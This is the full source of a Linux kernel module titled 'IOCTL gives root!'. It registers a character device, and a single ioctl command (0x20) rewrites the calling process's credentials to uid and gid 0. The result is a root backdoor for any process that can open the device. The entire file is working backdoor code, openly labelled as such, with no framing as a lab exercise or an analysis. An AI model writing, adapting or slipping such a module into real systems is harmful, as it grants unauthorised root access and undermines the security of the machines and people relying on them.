#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>

#define MY_MAJOR 0xec
#define IOCTL_GIVE_ROOT 0x20

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Diego Tellaroli");
MODULE_DESCRIPTION("IOCTL gives root!");

void give_root(void){
	struct cred *newcredentials;
        newcredentials = prepare_creds();

        if(newcredentials == NULL){
                return;
        }

        newcredentials->uid.val = 0;
        newcredentials->gid.val = 0;
        newcredentials->suid.val = 0;
        newcredentials->fsuid.val = 0;
        newcredentials->euid.val = 0;

        commit_creds(newcredentials);
}


static long my_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    switch (cmd) {
        case IOCTL_GIVE_ROOT:
	    give_root();
	    return 0;
            break;
        default:
            printk(KERN_INFO "[LKM_IOCTL] UNKNOW IOCTL: 0x%x\n", cmd);
            return -EINVAL;
    }
    return 0;
}

static int my_open(struct inode *inode, struct file *file) {
    printk(KERN_INFO "DEVICE OPENED\n");
    return 0;
}

static int my_release(struct inode *inode, struct file *file) {
    printk(KERN_INFO "DEVICE CLOSED\n");
    return 0;
}


static struct file_operations fops = {
    .unlocked_ioctl = my_ioctl,
    .open = my_open,
    .release = my_release,
};



static int __init lkm_init(void){
	int major = register_chrdev(MY_MAJOR, "ioctl_gives_root", &fops);
	if (major < 0) {
     	   	printk(KERN_ALERT "ERROR!\n");
        	return major;
    	}
	return 0;
}

static void __exit lkm_exit(void){
	unregister_chrdev(MY_MAJOR, "ioctl_gives_root");
}



module_init(lkm_init);
module_exit(lkm_exit);
